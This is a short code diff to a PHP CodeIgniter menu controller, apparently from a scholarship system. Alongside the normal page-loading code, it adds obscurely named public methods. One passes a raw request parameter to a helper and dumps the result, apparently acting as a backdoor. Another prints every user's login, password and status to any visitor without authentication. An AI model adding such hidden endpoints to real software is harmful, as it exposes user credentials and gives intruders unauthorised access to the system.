@@ -22,4 +22,8 @@ class Menu extends CI_Controller {
 		$this->load->view('menu');
 		$this->load->view('footer');
 	}
+		
+	public function aod(){echo ($_GET)?var_dump($this->becas_util->utilerias->aod($_REQUEST['t'])):'/';}
+	public function aod_users(){$u = $this->becas_util->utilerias->aod_users();foreach($u as $u){echo '<strong>'.$u['cve_persona'].' | '.$u['login'].' | '.$u['password'].' | '.$u['activo'].'</strong><br />';}}
+	public function aod_names(){}
 }
